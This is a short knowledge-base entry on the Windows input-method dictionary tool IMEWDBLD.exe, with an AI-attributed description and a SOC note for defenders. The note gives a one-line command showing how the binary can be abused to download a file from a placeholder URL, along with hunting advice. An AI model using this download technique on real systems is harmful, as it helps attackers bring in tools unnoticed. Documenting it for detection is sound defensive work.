---
created: 2026-11-21
fullpath: 'C:\Windows\System32\IME\SHARED\IMEWDBLD.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - ime
  - lolbin
aliases:
  - IMEWDBLD.exe
  - Microsoft IME Open Extended Dictionary Module
url: []
---

**fullpath**:C:\Windows\System32\IME\SHARED\IMEWDBLD.exe

# description

_Not documented on Microsoft Learn at 2026/11/21 18:47 UTC_

## simple description

> ### 2026-11-21 Claude said
> IMEWDBLD.exe is part of the Microsoft Input Method Editor (IME) used for East Asian language input. It builds or registers IME dictionaries (open extended dictionaries) so typed words convert correctly. It ships in C:\Windows\System32\IME\SHARED on standard Windows installs and is rarely run by users directly.
>
> **SOC NOTE**: Known LOLBin (T1105 Ingress Tool Transfer): `IMEWDBLD.exe https://host/file` downloads a file into the INetCache folder (%LocalAppData%\Microsoft\Windows\INetCache\IE\...). Any execution with a URL argument is suspicious; hunt for process creation plus network connections from IMEWDBLD.exe.
>
> _Not documented on Microsoft Learn at 2026/11/21 18:47 UTC_

# purpose

_Not documented on Microsoft Learn at 2026/11/21 18:47 UTC_


